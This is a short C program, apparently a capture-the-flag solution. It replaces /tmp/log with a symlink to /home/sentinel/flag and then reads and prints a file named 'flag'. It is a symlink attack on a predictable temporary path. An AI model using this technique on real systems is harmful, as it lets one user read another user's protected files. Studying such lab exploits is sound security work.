#include <assert.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>

int main(void) {
  ssize_t written;
  char flag[256];
  ssize_t count;
  int ret;
  int fd;

  ret = unlink("/tmp/log");
  assert(ret == 0);
  ret = symlink("/home/sentinel/flag", "/tmp/log");
  assert(ret == 0);
  fd = open("flag", O_RDONLY);
  assert(fd >= 0);
  count = read(fd, flag, sizeof(flag));
  assert(count > 0);
  written = write(STDOUT_FILENO, flag, count);
  assert(written == count);

  return EXIT_SUCCESS;
}
